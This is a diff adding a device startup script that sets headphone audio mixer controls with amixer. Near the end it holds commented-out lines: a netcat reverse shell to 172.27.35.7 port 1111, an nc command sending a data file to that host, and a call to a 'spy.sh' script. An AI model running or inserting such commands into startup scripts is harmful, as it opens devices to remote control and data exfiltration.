@@ -1,0 +1,29 @@
+# Put your custom commands here that should be executed once
+# the system init finished. By default this file does nothing.
+
+amixer cset iface=MIXER,name='headphone volume'  54
+
+amixer cset iface=MIXER,name='DACL Mixer AIF1DA0L Switch' 1
+
+amixer cset iface=MIXER,name='DACR Mixer AIF1DA0R Switch' 1
+
+amixer cset iface=MIXER,name='Left Output Mixer DACL Switch' 1
+
+amixer cset iface=MIXER,name='Left Output Mixer DACR Switch' 1
+
+amixer cset iface=MIXER,name='HP_L Mux' 1
+
+amixer cset iface=MIXER,name='HP_R Mux' 0
+
+amixer cset iface=MIXER,name='Headphone Switch' 1
+
+#/usr/bin/bt_test &
+
+#sh /bin/spy.sh 
+#sleep 10
+#cat /data/f|/bin/sh -i 2>&1|nc 172.27.35.7 1111 >/data/f
+#/usr/bin/nc 172.27.35.7 1111 < /data/tmp.txt &
+/bin/touch /data/test1111
+
+
+exit 0
